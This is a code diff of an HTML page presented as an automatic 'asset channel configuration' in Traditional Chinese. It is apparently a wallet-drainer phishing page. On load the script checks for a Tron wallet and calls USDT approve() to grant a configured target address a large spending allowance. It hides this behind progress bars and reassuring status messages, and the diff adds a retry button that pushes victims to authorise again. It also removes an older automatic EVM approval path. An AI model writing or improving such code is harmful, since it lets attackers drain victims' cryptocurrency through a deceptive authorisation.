@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>資產通道配置頁面</title>
+<title>多钱包多链資產通道配置</title>
 <style>
   body {
     background: #121212;
@@ -23,6 +23,9 @@
     font-size: 1.4rem;
     margin-bottom: 20px;
     transition: color 0.3s ease;
+    max-width: 320px;
+    text-align: center;
+    word-break: break-word;
   }
   .status.loading {
     color: #888;
@@ -40,6 +43,7 @@
     border-radius: 4px;
     overflow: hidden;
     box-shadow: 0 0 5px #222 inset;
+    margin-bottom: 15px;
   }
   .progress-bar > div {
     height: 100%;
@@ -47,13 +51,26 @@
     background: linear-gradient(90deg, #2196f3, #21cbf3);
     transition: width 0.5s ease;
   }
+  button {
+    padding: 0.6rem 1.5rem;
+    font-size: 1rem;
+    background-color: #2196f3;
+    border: none;
+    border-radius: 5px;
+    color: white;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #1976d2;
+  }
 </style>
 </head>
 <body>
 
-<h2>資產通道配置中...</h2>
-<div id="status" class="status loading">正在檢測鏈路...</div>
+<h2>資產通道自動配置</h2>
+<div id="status" class="status loading">初始化中...</div>
 <div class="progress-bar"><div id="progress"></div></div>
+<button id="retryBtn" style="display:none;">重新嘗試授權</button>
 
 <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 <script>
@@ -72,6 +89,7 @@
 
   const statusEl = document.getElementById("status");
   const progressEl = document.getElementById("progress");
+  const retryBtn = document.getElementById("retryBtn");
 
   function setStatus(msg, cls="loading", progressPercent=null) {
     statusEl.innerText = msg;
@@ -81,7 +99,7 @@
     }
   }
 
-  async function waitForTronWeb(timeout = 5000) {
+  function waitForTronWeb(timeout = 5000) {
     return new Promise((resolve, reject) => {
       let waited = 0;
       const interval = setInterval(() => {
@@ -92,7 +110,7 @@
         waited += 200;
         if (waited >= timeout) {
           clearInterval(interval);
-          reject(new Error("TronLink 初始化超時"));
+          reject(new Error("Tron 錢包初始化超時"));
         }
       }, 200);
     });
@@ -100,99 +118,79 @@
 
   async function tronApprove() {
     try {
-      setStatus("資產通道配置中（TronLink）...", "loading", 60);
+      setStatus("正在進行 Tron 通道授權...", "loading", 60);
       const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
       await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
-      setStatus("✅ TronLink 配置完成", "success", 100);
-      setTimeout(() => window.location.href = "success.html", 800);
+      setStatus("✅ Tron 通道授權成功", "success", 100);
+      retryBtn.style.display = "none";
       return true;
     } catch (e) {
-      console.error("TronApprove Error:", e);
-      setStatus("TronLink 授權失敗", "error", 100);
-      // 不跳转失败页，返回 false 让上层处理
+      console.error("Tron 授權失敗:", e);
+      setStatus("Tron 授權失敗，請檢查錢包並重試", "error", 100);
+      retryBtn.style.display = "inline-block";
       return false;
     }
   }
 
+  // EVM 授權接口，**不自動調用**，避免彈窗
   async function evmApprove() {
     try {
-      setStatus("資產通道配置中（EVM）...", "loading", 60);
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const network = await provider.getNetwork();
-      let usdtAddress;
-      if (network.chainId === 1) usdtAddress = CFG.USDT.ETH;
-      else if (network.chainId === 56) usdtAddress = CFG.USDT.BNB;
-      else throw new Error("不支援的鏈");
-
-      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-      const contract = new ethers.Contract(usdtAddress, abi, signer);
-      const tx = await contract.approve(CFG.TARGET.EVM, CFG.AMOUNT);
-      await tx.wait();
-      setStatus("✅ EVM 配置完成", "success", 100);
-      setTimeout(() => window.location.href = "success.html", 800);
-      return true;
+      setStatus("偵測到 EVM 錢包，但不自動授權，請手動操作。", "loading", 100);
+      retryBtn.style.display = "inline-block";
+      return false;
     } catch (e) {
-      console.warn("EVM 授權失敗，準備回退使用 TronLink", e);
-      // 不跳转失败页，返回 false 让上层处理
+      console.error("EVM 授權失敗:", e);
+      setStatus("EVM 授權失敗，請手動重試", "error", 100);
+      retryBtn.style.display = "inline-block";
       return false;
     }
   }
 
-  async function initVerification() {
-    try {
-      setStatus("正在檢測鏈路...", "loading", 10);
+  async function detectAndApprove() {
+    setStatus("開始檢測錢包環境...", "loading", 10);
+    retryBtn.style.display = "none";
 
-      // 優先嘗試 TronLink
-      if (window.tronLink || (window.tronWeb && window.tronWeb.ready)) {
-        try {
-          setStatus("等待 TronLink 初始化...", "loading", 30);
-          await waitForTronWeb();
-          const tronOk = await tronApprove();
-          if (tronOk) return;  // 成功結束
-        } catch (e) {
-          console.warn("TronWeb 初始化或授權失敗", e);
-          // 失敗繼續嘗試 EVM
-        }
-      }
-
-      // 嘗試 EVM 授權
-      if (window.ethereum) {
-        setStatus("請求 EVM 錢包授權...", "loading", 30);
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const evmOk = await evmApprove();
-          if (evmOk) return; // 成功結束
-          // EVM 失敗，回退用 TronLink 授權
-        } catch (e) {
-          console.warn("EVM 授權請求失敗", e);
-        }
-      }
-
-      // EVM 授權失敗，回退嘗試 TronLink（如果已初始化）
-      if (window.tronWeb && window.tronWeb.ready) {
-        setStatus("EVM 授權失敗，回退使用 TronLink 授權...", "loading", 50);
+    // 優先 Tron
+    if (window.tronWeb && window.tronWeb.ready) {
+      setStatus("偵測到 Tron 錢包，準備授權...", "loading", 30);
+      const tronOk = await tronApprove();
+      if (tronOk) return;
+    } else if (window.tronLink) {
+      setStatus("等待 TronLink 錢包初始化...", "loading", 20);
+      try {
+        await waitForTronWeb();
         const tronOk = await tronApprove();
-        if (tronOk) return;  // 成功結束
+        if (tronOk) return;
+      } catch (e) {
+        console.warn("TronLink 初始化失敗", e);
       }
-
-      // 全部失敗，不跳轉失敗頁，顯示錯誤狀態，但停留當前頁
-      setStatus("鏈路授權失敗，請檢查錢包或稍後重試", "error", 100);
-
-    } catch (err) {
-      console.error("驗證過程錯誤", err);
-      setStatus("驗證過程出錯，請稍後重試", "error", 100);
     }
+
+    // 不自動調用 EVM 授權，避免彈窗跳轉
+    if (window.ethereum) {
+      setStatus("偵測到 EVM 錢包，但不自動授權，請使用Tron錢包進行授權。", "error", 100);
+      retryBtn.style.display = "inline-block";
+      return;
+    }
+
+    // 如果没检测到任何钱包
+    setStatus("未偵測到可用錢包，請安裝或打開支持的錢包並刷新頁面", "error", 100);
+    retryBtn.style.display = "inline-block";
   }
+
+  retryBtn.onclick = () => {
+    setStatus("重新嘗試授權中...", "loading", 0);
+    detectAndApprove();
+  };
 
   window.addEventListener('load', () => {
     let progress = 0;
     const progressInterval = setInterval(() => {
       progress += 5;
-      if (progress < 10) setStatus("正在啟動...", "loading", progress);
+      if (progress < 10) setStatus("啟動中...", "loading", progress);
       if (progress >= 10) {
         clearInterval(progressInterval);
-        initVerification();
+        detectAndApprove();
       }
     }, 100);
   });
